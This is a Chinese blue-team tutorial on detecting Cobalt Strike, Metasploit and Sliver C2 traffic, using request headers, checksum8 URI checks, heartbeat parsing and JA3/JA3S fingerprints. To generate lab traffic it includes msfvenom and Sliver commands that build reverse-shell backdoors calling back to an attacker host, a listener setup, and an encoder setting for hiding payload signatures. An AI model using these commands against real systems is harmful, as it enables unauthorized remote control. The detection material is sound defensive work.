# 蓝队技能-流量分析篇&C2工具类&HTTPS协议&JA3&JA3S值&请求包体&MSF&CS&Sliver

![image-20251005171441542](https://img.yatjay.top/md/20251005171441589.png)

## 知识点

1、流量分析-C2工具

2、流量分析-HTTP/HTTPS

3、流量分析-MSF&CS&Sliver

## 演示案例

### 蓝队技能-流量分析-Webshell工具

见228

### 蓝队技能-流量分析-C2远控工具

目前流行的C2远控工具主要有：MSF、CS、Sliver、Viper、Havoc、Vshell、Supershell等，其中MSF、CS、Sliver、Viper使用较多，因此被研究也最多，容易分析；而最近几年流行Vshell、Supershell，作为红队推荐使用的是Havoc、Vshell、Supershell

#### CS

CS平台支持HTTP和HTTPS协议，两种协议的流量各自有其特征

![image-20251012165519349](https://img.yatjay.top/md/20251012165519384.png)

##### CS心跳包的原理机制

![image-20251012165510786](https://img.yatjay.top/md/20251012165510836.png)

##### CS后门操作

在Kali(192.168.1.9)启动一个CS服务端，监听

![image-20251012194501173](https://img.yatjay.top/md/20251012194501248.png)

![image-20251012194531927](https://img.yatjay.top/md/20251012194532003.png)

启动Windows的CS程序，配置服务端地址为192.168.1.9

![image-20251012194629398](https://img.yatjay.top/md/20251012194629435.png)

在CS配置监听器，配置协议为HTTP/HTTPS，上线端口分别配置为1111/2222，服务端地址配置为192.168.1.9

![image-20251012194934337](https://img.yatjay.top/md/20251012194934407.png)

![image-20251012194956121](https://img.yatjay.top/md/20251012194956182.png)

生成可执行程序

![image-20251012195108714](https://img.yatjay.top/md/20251012195108765.png)

![image-20251012195158558](https://img.yatjay.top/md/20251012195158609.png)

这是生成HTTP协议的监听器后门程序，同理可以生成HTTPS协议的监听器后门程序

![image-20251012195255688](https://img.yatjay.top/md/20251012195255748.png)

将生成的监听器后门程序在192.168.1.4主机执行，在该主机运行Wireshark进行网卡抓包，过滤HTTP/HTTPS的流量数据，观察其特征。

##### HTTP特征

==

CS和MSF有一个很大不同是CS存在心跳包，当不操作时，CS不会有流量；一旦操作才有流量，主要目的是避免安全工具查杀

- 间隔时间
- URL路径
- 下发指令
- UA头（老版本）

/cx

POST /submit.php?id=

==



根据上面操作，监听器后门程序所在地址为192.168.1.4，CS服务端地址为192.168.1.9，下图所框选为二者交互流量

![image-20251012195615471](https://img.yatjay.top/md/20251012195615555.png)

注意到一个Get请求，其请求地址为`/Jsh8`，注意到另一个Get请求，其请求地址为`/cm`

![image-20251012195852825](https://img.yatjay.top/md/20251012195852899.png)

实际上，CS的请求都是GET请求方法，具体有如下特征

###### 固定的数据报头部

默认的CS的请求头和响应头都是只有固定字段

请求头固定字段如下：

```
GET /xxxx HTTP/1.1
User-Agent: Mozilla/5.0(compatible; MS1E 9.0; WindowsNT 6.1; Trident/5.0; BOIE9;ENUS)
Host: 192.168.1.9:1111
Connection:Keep-Alive
Cache-Control: no-cache
```

响应头固定字段如下：

```
HTTP/1.1 200 OK
Date: Tue, 17 Sep 2024 12:19:32 GMT
Content-Type: application/octet-stream
Content-Length: 277063
```

###### 心跳包请求路径的checksum8算法

路径特征(强特征)：checksum8 ——>（92L 93L）

可以通过下面Java代码执行结果是92L或93L来确定是否为CS后门程序，这段代码是根据CS源码写出来的，这里不细究，前期CS魔改课程中提到过

将心跳包GET请求的路径放入`checksum8(String text)`参数中，如上面提到请求地址为`/Jsh8`，那么给`checksum8(String text)`传参即为`checksum8(“Jsh8”)`

- 若生成的后门程序是32位，则代码执行结果为92L
- 若生成的后门程序是64位，则代码执行结果为93L

```java
public class EchoTest {
    public static long checksum8(String text) {
        if (text.length() < 4) {
            return 0L;
        }

        text = text.replace("/", "");

        long sum = 0L;

        for (int x = 0; x < text.length(); x++) {
            sum += text.charAt(x);
        }

        return sum % 256L;
    }

    public static void main(String[] args) throws Exception {
        System.out.println(checksum8("Jsh8"));
    }
}
```

![image-20251012201018485](https://img.yatjay.top/md/20251012201018537.png)

传参执行后，生成结果为93，说明这是一个CS后门程序的流量。如果不是92、93，说明不是CS后门或者魔改过

###### 心跳包数据解析

将心跳包(第一个通信包)导出来：文件——导出HTTP对象——选中，导出为文件，随便取名字和后缀

![image-20251012201656888](https://img.yatjay.top/md/20251012201657003.png)

![image-20251012201807267](https://img.yatjay.top/md/20251012201807305.png)

使用下面工具解析，如果能够成功解析出心跳包中的数据，说明这是CS后门的流量

https://blog.didierstevens.com/didier-stevens-suite

https://github.com/DidierStevens/DidierStevensSuite

该项目之下有专门解析CS流量的Python脚本，将我们导出数据按如下格式提交

执行：`python 1768.py xxxx.vir`，可以解析出数据包内容如下

![image-20251012202221338](https://img.yatjay.top/md/20251012202221396.png)

可见通过上面项目代码，解析出了该后门程序的paload类别为基于Windows的http反弹shell、上线端口为`1111`、CS服务端IP地址.请求路径uri为`192.168.1.9./cm`等信息，对照Wireshark流量包进行验证，发现除了这个心跳包后续都是和`/cm`通信的

![image-20251012202545300](https://img.yatjay.top/md/20251012202545417.png)

##### HTTPS特征

HTTPS是密文传输的，一般无法直接读到信息，但HTTPS流量中存在的ja3和ja3s字段可以作为识别HTTPS流量的特征

在Wireshark筛选语句中过滤TLS协议的流量包，即可筛出HTTPS流量。

访问B站，查看HTTPS流量包中的ja3和ja3s字段





###### ja3 ja3s字段特征

在CS源码中配置有HTTPS数据包中的默认ja3和ja3s字段值，其中

- `client hello`数据包中，存在默认的`ja3`字段值为下面二者之一(版本不同则该值不同)
  - `4d5efa96609dc906f796e63cff009c2a` 
  - `db36bad574044a5104a59b0c676991ef`

- `server hello` 数据包中，存在默认的`ja3s`字段值为下面二者之一(版本不同则该值不同)
  - `15af977ce25de452b96affa2addb1036`
  - `2253c82f03b621c5144709b393fde2c9`

演示：按照前面的流程生成HTTPS协议的后门程序，在192.168.1.4主机执行(CS服务端地址为192.168.1.9)，并用Wireshark抓包，查看流量特征

要先定位HTTPS流量中，客户端Hello和服务端Hello的两个流量包，如下图框选的位置

![image-20251012203649564](https://img.yatjay.top/md/20251012203649671.png)

追踪客户端Client Hello包的流，查看流量包详细数据，其中有一个字段为JA3

![image-20251012203844434](https://img.yatjay.top/md/20251012203844552.png)

追踪服务端Server Hello包的流，查看流量包详细数据，其中有一个字段为JA3S

![image-20251012204000365](https://img.yatjay.top/md/20251012204000480.png)

注意流量包编号，Client Hello是先发送的，Server Hello是后发送的，二者有先后，图中是反的

实际上，一些检测工具如IDS检测CS流量时，其规则也会匹配此项特征

除了肉眼观察之外，还可将pcap包交给一些现成的Python脚本，提取流量包中的ja3和ja3s值

我们将上面捕获的数据保存为`https.pcapng`数据包，在资源包当中有提取ja3和ja3s字段值的Python脚本(开源项目地址：https://github.com/salesforce/ja3)

![image-20251012205612810](https://img.yatjay.top/md/20251012205612846.png)

使用命令`python.exe ja3.py -a https.pcapng`，即可解析流量包中的所有`ja3`值，如db开头he 4d5e开头的这个就是CS的流量中的，其他值是HTTPS访问其他网站时所使用的

![image-20251012210000686](https://img.yatjay.top/md/20251012210000872.png)

使用命令`python.exe ja3s.py -a https.pcapng`，即可解析流量包中的所有`ja3s`值，如15af开头和2253开头的这个就是CS的流量中的，其他值是HTTPS访问其他网站时所使用的

![image-20251012210318087](https://img.yatjay.top/md/20251012210318240.png)

###### 证书特征

证书特征(.store)——无

#### MSF

通过前面章节实验可知，MSF一旦连接上，就能一直控制；而CS的流量时时有时无的，控制端有命令时才有流量，控制端无命令时就没有流量，这正是二者的不同作用机制。相比MSF，显然CS进化了，CS更容易隐藏和免杀，MSF现在已经慢慢淘汰

MSF是实时控制的机制，没有心跳包，因此不能使用心跳包解析

##### MSF后门操作

在Kali上编辑后门MSF程序配置并生成可执行程序

`msfvemon -p windows/x64/shell/reverse_tcp lhost=192.168.1.9 lport=6666 -f exe -o 6666.exe `

这句命令含义为：生成一个用于64位Windows系统的反向TCP连接的后门程序，这个后门会主动连接到你（攻击者）的机器（192.168.1.9）的6666端口，并将生成的后门保存为一个名为`6666.exe`的可执行文件。

![image-20251012211544586](https://img.yatjay.top/md/20251012211544628.png)

启动MSFconsole

![image-20251012211525406](https://img.yatjay.top/md/20251012211525449.png)

配置MSFconsole：

![image-20251012211704543](https://img.yatjay.top/md/20251012211704603.png)

上面Payload配错了，后面更正如下：

![image-20251012213739075](https://img.yatjay.top/md/20251012213739143.png)

这段代码是在 Metasploit Framework (MSF) 的控制台 (`msfconsole`) 中配置一个 监听器 (Handler)，用于接收来自之前生成的恶意负载（如 `6666.exe`）的连接。

以下是逐行解释：

1. `use exploit/multi/handler`作用： 选择 Metasploit 的 `multi/handler`模块。解释： 这是一个通用的、多用途的“漏洞利用”模块。它本身不利用特定漏洞，而是专门用来监听传入的连接，等待由 `msfvenom`生成的 payload（如反向 shell、meterpreter 等）主动连接回来。它是接收反弹 shell 的标准方式。
2. `[\*] Using configured payload generic/shell_reverse_tcp`作用： 系统提示当前默认使用的 payload 是 `generic/shell_reverse_tcp`。解释： 当你进入 `multi/handler`模块时，它会有一个默认的 payload 设置。这行只是告诉你当前的默认值是什么。
3. `set payload windows/meterpreter/reverse_http`(此处应为`set payload windows/x64/shell/reverse_tcp`，图中错误)作用： 显式设置 handler 将监听的 payload 类型为 `windows/meterpreter/reverse_http`。解释： 这至关重要！它告诉 handler：“我期待连接回来的是一个针对 Windows 系统的 Meterpreter shell，并且它使用的是 TCP 协议进行反向连接”。这个设置必须与之前用 `msfvenom`生成 payload 时指定的 `-p`参数完全匹配，因此应该配置成`set payload windows/x64/shell/reverse_tcp`。
4. `set lhost 0.0.0.0`作用： 设置 监听主机 (Local Host) 的 IP 地址为 `0.0.0.0`。解释： `0.0.0.0`是一个特殊地址，表示监听本机所有可用的网络接口 (IP 地址)。这意味着：如果攻击者机器有多个网卡（比如同时连接着有线网络 `192.168.1.9`和 Wi-Fi `10.0.0.5`），handler 会在所有这些接口的指定端口上监听。目标 payload 可以连接到攻击者机器的任何一个 IP 地址（如 `192.168.1.9:6666`或 `10.0.0.5:6666`），只要端口正确，handler 都能接收到连接。这比指定一个具体的 IP（如 `192.168.1.9`）更灵活，尤其是在网络环境复杂或 IP 可能变化的情况下。
5. `set lport 6666`作用： 设置 监听端口 (Local Port) 为 `6666`。解释： 这指定了 handler 将在哪个端口上等待连接。这个端口号必须与之前用 `msfvenom`生成 payload 时指定的 `lport`参数完全一致。目标 payload 会尝试连接到 `lhost`的这个端口。
6. `run` (或等效命令 `exploit`)作用： 启动配置好的监听器。解释： 执行此命令后，Metasploit 的 handler 模块就会在指定的 IP 地址 (`0.0.0.0`) 和端口 (`6666`) 上开始监听，等待目标机器上的 payload (`6666.exe`) 执行后发起的反向连接。
7. `[\*] Started HTTP reverse handler on http://0.0.0.0:6666`作用： 系统提示监听器已成功启动。解释： 这确认了 handler 正在运行。它监听在所有网络接口 (`0.0.0.0`) 的 `6666`端口上，并且因为 payload 设置为 `reverse_http`，它使用 HTTP 协议进行通信（注意 URL 显示为 `http://`）。

总结这段代码在配置什么：

1. 选择监听模块： 使用 `multi/handler`来接收反弹连接。
2. 指定 Payload 类型： 明确告诉 handler 期待接收的是哪种类型的连接 (`windows/meterpreter/reverse_http`)。
3. 设置监听地址： 让 handler 监听本机的所有网络接口 (`0.0.0.0`)。
4. 设置监听端口： 让 handler 在端口 `6666`上监听连接。
5. 启动监听器： 执行 `run`命令，使配置生效并开始等待目标连接。

在被控端Windows主机执行6666.exe，在MSFconsole可以看到上线

![image-20251012213020777](https://img.yatjay.top/md/20251012213020830.png)

此时即可执行cmd命令了，此时Wireshark抓取流量，观察特征

##### shell模式明文传输

1、shell模式 明文传输

使用下述语句语句配置一个tcp反弹shell后门程序

`msfvenom -p windows/x64/shell/reverse_tcp lhost=xx lport=6666 -f exe -o 6666.exe`

当MSF以shell模式进行远控命令执行时，交互的流量都是明文传输不做加密的，因此我们从数据包明文中判断命令执行

![image-20251012213345357](https://img.yatjay.top/md/20251012213345433.png)

##### meterpreter模式 HTTP

使用下述命令配置一个http反弹的meterpreter后门程序

`msfvenom -p windows/meterpreter/reverse_http lhost=xx lport=6667 -f exe -o 6667.exe`

这是生成一个针对 Windows 系统的、使用 Meterpreter 且通过 HTTP 协议进行反向连接的负载（后门程序）。这个后门会主动连接到攻击者机器（IP 地址为 `xx`）的 6667 端口，并将生成的后门保存为名为 `6667.exe`的可执行文件。

###### 请求包和响应包固定格式

特征：固定的数据包请求和返回模版（格式一致）即request和response返回的数据包格式一致

当使用meterpreter_http模式时，HTTP协议的流量包头部是固定的，而且没有心跳包，判断数据包的请求是不是固定的几个东西，固定如下：

固定请求包格式：

```shell
GET /xxx(不固定，随机的) HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12.2; rv:97.0) Gecko/20100101 Firefox/97.0  //（UA头由版本决定，固定的是Mozilla/5.0 (）
Host: xx.xx.xx.xx:xxxx
Connection: Keep-Alive
Cache-Control: no-cache
```

固定响应包格式：

```shell
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Connection: Keep-Alive
Server: Apache
Content-Length: 176220（不固定）
```

如下图所示

![image-20251012215242898](https://img.yatjay.top/md/20251012215242985.png)

###### MZ标头异常

文件头：MZ标头和DOS模式异常

MSF默认的响应包文件头MZ这部分开头会显示DOS模式异常，如下图所示

![image-20251012215559621](https://img.yatjay.top/md/20251012215559708.png)

红队一般都会修改以隐藏这部分特征，配置Payload时使用如下语句即可混淆文件头的上述特征部分

- `set enablestageencoding true`

- `set stageencoder x86/shikata_ga_nai`

##### meterpreter模式 HTTPS-ja3/s指纹特征

使用下述命令配置一个http反弹的meterpreter后门程序

`msfvenom -p windows/meterpreter_reverse_https lhost=xx lport=6669 -f exe -o 6668.exe`

这是生成一个针对 Windows 系统的、使用 Meterpreter 且通过 HTTPS 协议进行反向连接的负载（后门程序）。这个后门会主动连接到攻击者机器（IP 地址为 `xx`）的 6669 端口，并将生成的后门保存为名为 `6668.exe`的可执行文件。

MSF的HTTPS协议后门特征也体现在JA3/JA3S值(各个MSF版本有其固定值)，比如Kali2023的MSF中这两个字段固定值具体如下

- JA3字段值固定为：

  - 4d93395b1c1b9ad28122fb4d09f28c5e

  - 652358a663590cfc624787f06b82d9ae

- JA3S字段值固定为：

  - 15af977ce25de452b96affa2addb1036

  - 2253c82f03b621c5144709b393fde2c9

#### Sliver

##### Sliver后门操作

使用视频：162课

使用参考：https://forum.butian.net/share/2243

项目下载：https://github.com/BishopFox/sliver

启动Sliver服务端：`./sliver-server_linux`

![image-20251012221132370](https://img.yatjay.top/md/20251012221132427.png)

生成后门程序：`generate --http http://172.16.181.182:9001 --os windows`，这是一个HTTP协议的Windows后门

![image-20251012221453677](https://img.yatjay.top/md/20251012221453717.png)

创建监听器，监听9001端口：`http -l 9001`

![image-20251012221552251](https://img.yatjay.top/md/20251012221552308.png)

在Windows主机执行生成的后门程序，可以看到后门上线

![image-20251012221708323](https://img.yatjay.top/md/20251012221708389.png)

执行一些命令然后抓取流量

![image-20251012221749542](https://img.yatjay.top/md/20251012221749594.png)

##### Sliver流量特征分析参考

分析参考1：https://mp.weixin.qq.com/s/9PuyKtwY5WbjAGLbLHUmuw

分析参考2：https://mp.weixin.qq.com/s/G3ggCKxQy0nOqRuTUPHfiQ

##### HTTP特征

观察请求路径似乎都是一些模拟正常的js文件的路径

![image-20251012222109186](https://img.yatjay.top/md/20251012222109271.png)

Sliver是一个开源项目，在其源码当中，存在一个配置文件`server\configs\http-c2.go`，专门用来配置请求路径、Cookie的样子，该文件能够配置的项有：

- 固定url路径

- 参数名称的构造规律

- 参数值的长度及规律

- sessionID/Cookie的交换

- Cookie的名称生成、cookie值的长度及规律

比如，关于Cookie，可配置为下述名称之一

```go
// Pro-tip: You can use ChatGPT to generate this stuff for you!
	Cookies = []string{
		"JSESSIONID",
		"rememberMe",
		"authToken",
		"userId",
		"userName",
		"language",
		"theme",
		"locale",
		"currency",
		"lastVisited",
		"loggedIn",
		"userRole",
		"cartId",
		"accessToken",
		"refreshToken",
		"consent",
		"notificationPreference",
		"userSettings",
		"sessionTimeout",
		"error",
		"errorMessage",
		"successMessage",
		......
		}
```

关于请求路径/文件，可配置为下述名称及其组合

```go
PollPaths = []string{
		"js",
		"umd",
		"assets",
		"bundle",
		"bundles",
		"scripts",
		"script",
		"javascripts",
		"javascript",
		"jscript",
		"js",
		"scripts",
		"assets",
		"src",
		"lib",
		"public",
		"static",
		"app",
		"www",
		"dist",
    ......
	}


PollFiles = []string{
		"bootstrap",
		"bootstrap.min",
		"jquery.min",
		"jquery",
		"route",
		"app",
		"app.min",
		"array",
		"backbone",
		"script",
		"email",
		"main",
		"index",
		"utils",
		"jquery.min",
		"bootstrap",
		"angular",
    ......
}
```

比如，下面的Sliver的Cookie值模拟亚马逊的某应用流量，这个AWSALBCORS一定能够在配置文件中找到

![image-20251012221934661](https://img.yatjay.top/md/20251012221934762.png)

可以**根据路径文件名，后缀，cookie这些信息到源码里面的数组随机组合配合分析排查**

比如，Sliver的C2木马连接服务端有5种类型的消息，使用内置路径段随机生成请求路径，所有路径将具有以下扩展名之一，不同的文件扩展名指示了请求的类型。除了扩展名之外，路径中的所有内容都会被服务器忽略。

- .woff = Stagers（默认不使用）
- .js = Long poll messages（长消息轮询，加密交互数据）
- .html = Key exchange messages （密钥交换，set-cookie）
- .php = Session messages
- .png = Close session messages（关闭会话）

详细的字段特征，可以参考下面文章：

- 分析参考1：https://mp.weixin.qq.com/s/9PuyKtwY5WbjAGLbLHUmuw

- 分析参考2：https://mp.weixin.qq.com/s/G3ggCKxQy0nOqRuTUPHfiQ

##### HTTPS特征-ja3/s指纹特征

ja3/ja3s

Client Hello的JA3字段固定为：19e29534fd49dd27d09234e639c4057e

![image-20251012224112378](https://img.yatjay.top/md/20251012224112477.png)

Server Hello的JA3S字段固定为：f4febc55ea12b31ae17cfb7e614afda8

![image-20251012224155169](https://img.yatjay.top/md/20251012224155255.png)

除了肉眼观察之外，还可将pcap包交给一些现成的Python脚本，提取流量包中的ja3和ja3s值

我们将上面捕获的数据保存为`https.pcapng`数据包，在资源包当中有提取ja3和ja3s字段值的Python脚本(开源项目地址：https://github.com/salesforce/ja3)

- 提取流量包中的ja3字段值：d:\Python3.8\python.exe ja3.py -a https.pcapng

- 提取流量包中的ja3s字段值：d:\Python3.8\python.exe ja3s.py -a https.pcapng

这个项目也支持ja3/s字段提取：https://github.com/Macr0phag3/ja3box

